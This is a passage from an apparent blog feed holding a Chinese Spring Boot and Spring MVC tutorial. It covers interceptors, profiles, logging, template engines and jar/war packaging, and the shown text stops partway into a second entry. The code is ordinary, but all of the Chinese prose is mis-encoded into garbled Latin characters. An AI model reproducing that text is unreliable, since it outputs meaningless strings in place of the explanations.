<code>WebMvcConfigurer</code>æ¥å£ï¼Œ<code>loginInterceptor</code>ä¸ºæˆ‘ä»¬å®šä¹‰çš„æ‹¦æˆªå™¨ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MVCConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> LoginInterceptor <span class="title function_">loginInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LoginInterceptor</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(loginInterceptor())</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/login&quot;</span>, <span class="string">&quot;/css/**&quot;</span>, <span class="string">&quot;/js/**&quot;</span>, <span class="string">&quot;/images/**&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="SpringBootç¨‹åºç¼–å†™"><a href="#SpringBootç¨‹åºç¼–å†™" class="headerlink" title="SpringBootç¨‹åºç¼–å†™"></a>SpringBootç¨‹åºç¼–å†™</h2><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><p>é…ç½®ä¾èµ–é¡¹ï¼ŒSpringBooté¡¹ç›®å¿…é¡»è¦å°†<code>&lt;parent&gt;</code>æ ‡ç­¾è®¾ç½®ä¸ºSpringBootçš„parentï¼Œè¯¥parentåŒ…å«äº†å¤§é‡é»˜è®¤é…ç½®ï¼Œå¸®åŠ©å¼€å‘è€…è‡ªåŠ¨é€‰æ‹©ä¾èµ–ç‰ˆæœ¬ï¼Œç®€åŒ–äº†å¼€å‘ç¨‹åº</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é…ç½®æ’ä»¶ï¼Œç”¨äºæ–¹ä¾¿æ‰“åŒ…ç¯èŠ‚</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç¼–å†™æºç "><a href="#ç¼–å†™æºç " class="headerlink" title="ç¼–å†™æºç "></a>ç¼–å†™æºç </h3><p>ç¼–å†™Controllerç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(&quot;hello&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello SpringBoot&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå¯åŠ¨ç¨‹åº</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Starter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Starter.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯åŠ¨<code>main</code>æ–¹æ³•ï¼Œå°±å¯ä»¥é»˜è®¤è¿è¡Œåœ¨8080ç«¯å£ä¸‹</p><br/><h2 id="SpringBootè‡ªå®šä¹‰é…ç½®"><a href="#SpringBootè‡ªå®šä¹‰é…ç½®" class="headerlink" title="SpringBootè‡ªå®šä¹‰é…ç½®"></a>SpringBootè‡ªå®šä¹‰é…ç½®</h2><h3 id="Bannerå›¾æ ‡"><a href="#Bannerå›¾æ ‡" class="headerlink" title="Bannerå›¾æ ‡"></a>Bannerå›¾æ ‡</h3><p>SpringBootå¯åŠ¨çš„é»˜è®¤Bannerå›¾æ ‡</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">  .   ____          _            __ _ _</span><br><span class="line"> /\\ / ___&#x27;_ __ _ _(_)_ __  __ _ \ \ \ \</span><br><span class="line">( ( )\___ | &#x27;_ | &#x27;_| | &#x27;_ \/ _` | \ \ \ \</span><br><span class="line"> \\/  ___)| |_)| | | | | || (_| |  ) ) ) )</span><br><span class="line">  &#x27;  |____| .__|_| |_|_| |_\__, | / / / /</span><br><span class="line"> =========|_|==============|___/=/_/_/_/</span><br><span class="line"> :: Spring Boot ::               (v2.7.18)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åœ¨<code>src/main/resources</code>ç›®å½•ä¸‹æ–°å»º<code>banner.txt</code>æ–‡ä»¶ï¼Œè¿™æ ·ç¨‹åºå¯åŠ¨æ—¶ä¼šåŠ è½½æˆ‘ä»¬è‡ªå®šä¹‰çš„å›¾æ ‡æ–‡ä»¶</p><h3 id="SpringBooté…ç½®æ–‡ä»¶"><a href="#SpringBooté…ç½®æ–‡ä»¶" class="headerlink" title="SpringBooté…ç½®æ–‡ä»¶"></a>SpringBooté…ç½®æ–‡ä»¶</h3><p>Spring Boot é»˜è®¤ä¼šè¯»å–å…¨å±€é…ç½®æ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶åå›ºå®šä¸ºï¼š<code>application.properties</code> æˆ– <code>application.yml</code>ï¼Œæ”¾ç½®åœ¨ <code>src/main/resources</code> èµ„æºç›®å½•ä¸‹ï¼Œä½¿ç”¨é…ç½®æ–‡ä»¶æ¥ä¿®æ”¹ SpringBoot è‡ªåŠ¨é…ç½®çš„é»˜è®¤å€¼</p><p>åœ¨ resources èµ„æºç›®å½•ä¸‹æ·»åŠ  <code>application.properties</code> æ–‡ä»¶ï¼Œé…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">### é¡¹ç›®å¯åŠ¨ç«¯å£å·é…ç½®</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br><span class="line"><span class="comment">### é¡¹ç›®è®¿é—®ä¸Šä¸‹æ–‡è·¯å¾„</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/mvc</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">### æ•°æ®æºé…ç½®</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:mysql://127.0.0.1:3306/DBName?useUnicode=true&amp;characterEncoding=utf8</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure><h3 id="Peofileé…ç½®"><a href="#Peofileé…ç½®" class="headerlink" title="Peofileé…ç½®"></a>Peofileé…ç½®</h3><p>Profile æ˜¯ Spring ç”¨æ¥é’ˆå¯¹ä¸åŒç¯å¢ƒå¯¹ä¸åŒé…ç½®æä¾›æ”¯æŒçš„å…¨å±€ Profile é…ç½®ä½¿ç”¨ <code>application-{profile}.yml</code>ï¼Œæ¯”å¦‚ <code>application-dev.yml</code>ï¼Œ<code>application-test.yml</code></p><p>é€šè¿‡åœ¨ <code>application.yml</code> ä¸­è®¾ç½® <code>spring.profiles.active=test|dev|prod</code> æ¥åŠ¨æ€åˆ‡æ¢ä¸åŒç¯å¢ƒï¼Œå…·ä½“é…ç½®å¦‚ä¸‹ï¼š</p><p><code>application-dev.yml</code> å¼€å‘ç¯å¢ƒé…ç½®æ–‡ä»¶</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8989</span></span><br></pre></td></tr></table></figure><p><code>application-test.yml</code> æµ‹è¯•ç¯å¢ƒé…ç½®æ–‡ä»¶</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><code>application.yml</code> ä¸»é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨<code>active</code>å±æ€§åˆ‡æ¢ç¯å¢ƒ</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure><h3 id="æ—¥å¿—é…ç½®"><a href="#æ—¥å¿—é…ç½®" class="headerlink" title="æ—¥å¿—é…ç½®"></a>æ—¥å¿—é…ç½®</h3><p>Spring Boot é»˜è®¤ä½¿ç”¨ LogBack æ—¥å¿—ç³»ç»Ÿï¼Œå¦‚æœä¸éœ€è¦æ›´æ”¹ä¸ºå…¶ä»–æ—¥å¿—ç³»ç»Ÿå¦‚ Log4j2 ç­‰ï¼Œåˆ™æ— éœ€å¤šä½™çš„é…ç½®ï¼ŒLogBack é»˜è®¤å°†æ—¥å¿—æ‰“å°åˆ°æ§åˆ¶å°ä¸Šã€‚å¦‚æœè¦ä½¿ç”¨ Log4j2ï¼ŒåŸåˆ™ä¸Šæ˜¯éœ€è¦æ·»åŠ  dependency ä¾èµ–çš„</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Spring Boot Web Starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- æ’é™¤é»˜è®¤çš„ Logback --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!-- æ·»åŠ  Log4j2 Starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨ç±»æ¼”ç¤ºä½¿ç”¨æ—¥å¿—</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Starter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(Starter.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;SpringBoot LogInfoTest&quot;</span>);</span><br><span class="line">        SpringApplication.run(Starter.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ—¥å¿—è¾“å‡ºæ ¼å¼ï¼Œå°†å…¶æ·»åŠ è¿›<code>application.yml</code>ä¸­</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">pattern:</span></span><br><span class="line">    <span class="attr">console:</span> <span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%thread] %-5level %logger - %msg%n&quot;</span></span><br><span class="line">  <span class="attr">level:</span> <span class="string">debug</span></span><br><span class="line">  <span class="attr">file:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&quot;springboot.log&quot;</span></span><br></pre></td></tr></table></figure><br/><h2 id="è§†å›¾é›†æˆ"><a href="#è§†å›¾é›†æˆ" class="headerlink" title="è§†å›¾é›†æˆ"></a>è§†å›¾é›†æˆ</h2><h3 id="FreeMarkæ¨¡æ¿å¼•æ“"><a href="#FreeMarkæ¨¡æ¿å¼•æ“" class="headerlink" title="FreeMarkæ¨¡æ¿å¼•æ“"></a>FreeMarkæ¨¡æ¿å¼•æ“</h3><p>å¼•å…¥ä¾èµ–é¡¹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-freemarker<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Freemarker é»˜è®¤è§†å›¾è·¯å¾„ä¸º <code>resources/templates</code> ç›®å½•(ç”±è‡ªåŠ¨åŒ–é…ç½®ç±» <code>FreemarkerProperties</code> å†³å®š)ï¼Œè¯¥ç›®å½•å¯ä»¥åœ¨<code>application.yml</code>ä¸­è¿›è¡Œä¿®æ”¹</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">freemarker:</span></span><br><span class="line">    <span class="attr">suffix:</span> <span class="string">.ftl</span></span><br><span class="line">    <span class="attr">content-type:</span> <span class="string">text/html</span></span><br><span class="line">    <span class="attr">charset:</span> <span class="string">UTF-8</span></span><br><span class="line">    <span class="attr">template-loader-path:</span> <span class="string">classpath:/views/</span></span><br></pre></td></tr></table></figure><p>FreeMarkçš„çš„æ¨¡æ¿æ–‡ä»¶åç¼€æ˜¯<code>.ftl</code></p><h3 id="Thymeleafæ¸²æŸ“å¼•æ“"><a href="#Thymeleafæ¸²æŸ“å¼•æ“" class="headerlink" title="Thymeleafæ¸²æŸ“å¼•æ“"></a>Thymeleafæ¸²æŸ“å¼•æ“</h3><p>SpringBoot æ”¯æŒå¤šç§è§†å›¾æŠ€æœ¯é›†æˆï¼Œå¹¶ä¸” SpringBoot å®˜ç½‘æ¨èä½¿ç”¨ Thymeleaf ä½œä¸ºå‰ç«¯è§†å›¾é¡µé¢ï¼Œè¿™é‡Œå®ç° Thymeleaf è§†å›¾é›†æˆï¼Œå€ŸåŠ©å…¥é—¨é¡¹ç›®å¼•å…¥ Thymeleaf ç¯å¢ƒé…ç½®</p><p>å¼•å…¥ä¾èµ–é¡¹</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Thymeleaf é»˜è®¤è§†å›¾è·¯å¾„ä¸º <code>resources/templates</code> ç›®å½•(ç”±è‡ªåŠ¨åŒ–é…ç½®ç±» <code>ThymeleafProperties</code> å†³å®š)ï¼Œè¯¥ç›®å½•å¯ä»¥åœ¨<code>application.yml</code>ä¸­è¿›è¡Œä¿®æ”¹</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">thymeleaf:</span></span><br><span class="line">    <span class="attr">prefix:</span> <span class="string">classpath:/html/</span></span><br><span class="line">    <span class="comment"># å…³é—­ thymeleaf é¡µé¢ç¼“å­˜</span></span><br><span class="line">    <span class="attr">cache:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>Thymeleafå¯ä»¥ç›´æ¥å¯¹htmlè¿›è¡Œæ¸²æŸ“ï¼Œä½¿ç”¨å…¶ç‰¹å®šçš„è¯­æ³•å³å¯è¯†åˆ«è¿›è¡Œæ¸²æŸ“</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><br/><h2 id="é™æ€èµ„æºè®¿é—®"><a href="#é™æ€èµ„æºè®¿é—®" class="headerlink" title="é™æ€èµ„æºè®¿é—®"></a>é™æ€èµ„æºè®¿é—®</h2><p>åœ¨ <code>resources</code> ç›®å½•ä¸‹åˆ›å»º <code>static</code> æˆ–è€… <code>public</code> ç›®å½•ï¼Œå­˜æ”¾<code>images</code>ã€<code>js</code>ã€<code>css</code> ç­‰é™æ€èµ„æºæ–‡ä»¶ï¼Œé»˜è®¤çš„è·¯å¾„æœ‰<code>resources/public</code>ã€<code>resources/static</code>ã€<code>resources/</code></p><p>è‹¥è¦è‡ªå®šä¹‰é™æ€èµ„æºè·¯å¾„ï¼Œå¯ä»¥åœ¨<code>application.yml</code>ä¸­æ·»åŠ </p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="attr">static-locations:</span> <span class="string">classpath:/public/,classpath:/static/,classpath:/path/to/your/static</span></span><br></pre></td></tr></table></figure><br/><h2 id="åº”ç”¨æ‰“åŒ…"><a href="#åº”ç”¨æ‰“åŒ…" class="headerlink" title="åº”ç”¨æ‰“åŒ…"></a>åº”ç”¨æ‰“åŒ…</h2><h3 id="JaråŒ…éƒ¨ç½²"><a href="#JaråŒ…éƒ¨ç½²" class="headerlink" title="JaråŒ…éƒ¨ç½²"></a>JaråŒ…éƒ¨ç½²</h3><p>åœ¨ IDEA ä¸‹é…ç½® <code>clean compile package -Dmaven.test.skip=true</code> æ‰§è¡Œæ‰“åŒ…å‘½ä»¤ï¼Œtarget ç›®å½•å¾—åˆ°å¾…éƒ¨ç½²çš„é¡¹ç›®æ–‡ä»¶</p><p>æ‰“åŒ…å®Œæˆåï¼Œä½¿ç”¨å‘½ä»¤è¡Œå³å¯ç¼–è¯‘jaråŒ…è¿è¡Œwebç¨‹åº</p><h3 id="WaråŒ…éƒ¨ç½²"><a href="#WaråŒ…éƒ¨ç½²" class="headerlink" title="WaråŒ…éƒ¨ç½²"></a>WaråŒ…éƒ¨ç½²</h3><p>ä¿®æ”¹<code>pom.xml</code>çš„<code>&lt;packaging&gt;</code>æ ‡ç­¾æ”¹ä¸º<code>war</code>ï¼Œé»˜è®¤ä¸º<code>jar</code></p><p>å¿½ç•¥å†…åµŒTomcatï¼Œä½¿ç”¨<code>provided</code>å±æ€§å¿½ç•¥</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é…ç½®ç”Ÿæˆçš„waråŒ…å±æ€§</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- é…ç½®ç”Ÿæˆçš„ war æ–‡ä»¶å --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>springboot<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨ç±»ç»§æ‰¿<code>SpringBootServletInitializer</code>å¹¶é‡å†™<code>configure()</code>æ–¹æ³•ï¼ŒæŒ‡å®šå¤–éƒ¨tomcatè¯»å–é¡¹ç›®å…¥å£æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Starter</span> <span class="keyword">extends</span> <span class="title class_">SpringBootServletInitializer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(Starter.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;SpringBoot LogInfoTest&quot;</span>);</span><br><span class="line">        SpringApplication.run(Starter.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> SpringApplicationBuilder <span class="title function_">configure</span><span class="params">(SpringApplicationBuilder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> builder.sources(Starter.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œmavenæ‰“åŒ…å‘½ä»¤ï¼Œç”ŸæˆwaråŒ…</p><br/>]]></content>
      
      
      <categories>
          
          <category> ç®€æ˜“å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMVCç¬¬äºŒéƒ¨åˆ†</title>
      <link href="/2025/12/30/SpringMVC%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/"/>
      <url>/2025/12/30/SpringMVC%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringMVCç¬¬äºŒéƒ¨åˆ†"><a href="#SpringMVCç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="SpringMVCç¬¬äºŒéƒ¨åˆ†"></a>SpringMVCç¬¬äºŒéƒ¨åˆ†</h1><br/><h2 id="æ‹¦æˆªå™¨"><a href="#æ‹¦æˆªå™¨" class="headerlink" title="æ‹¦æˆªå™¨"></a>æ‹¦æˆªå™¨</h2><p>SpringMVC ä¸­çš„ Interceptor æ‹¦æˆªå™¨ä¹Ÿæ˜¯ç›¸å½“é‡è¦å’Œç›¸å½“æœ‰ç”¨çš„ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯æ‹¦æˆªç”¨æˆ·çš„è¯·æ±‚å¹¶è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚æ¯”å¦‚é€šè¿‡å®ƒæ¥è¿›è¡Œæƒé™éªŒè¯ï¼Œæˆ–è€…æ˜¯æ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»é™†ç­‰æ“ä½œ</p><h3 id="å®ç°æ–¹å¼"><a href="#å®ç°æ–¹å¼" class="headerlink" title="å®ç°æ–¹å¼"></a>å®ç°æ–¹å¼</h3><p><strong>å®ç°<code>HandlerInterceptor</code>æ¥å£</strong></p><p>å®ç°æ¥å£ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">default</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, <span class="meta">@Nullable</span> ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, <span class="meta">@Nullable</span> Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>preHandle()</code>æ–¹æ³•è¡¨ç¤ºåœ¨ç›®æ ‡æ‹¦æˆªæ–¹æ³•æ‰§è¡Œå‰è¿›è¡Œçš„æ“ä½œï¼Œå…¶è¿”å›å€¼è‹¥ä¸º<code>true</code>åˆ™ä¼šç»§ç»­æ‰§è¡Œç›®æ ‡æ–¹æ³•ï¼Œåä¹‹åˆ™ä¸æ‰§è¡Œã€‚<code>postHandle()</code>è¡¨ç¤ºåœ¨æ–¹æ³•æ‰§è¡Œåè¿”å›è§†å›¾å‰è¿›è¡Œçš„æ“ä½œï¼Œ<code>afterCompletion()</code>è¡¨ç¤ºåœ¨ç›®æ 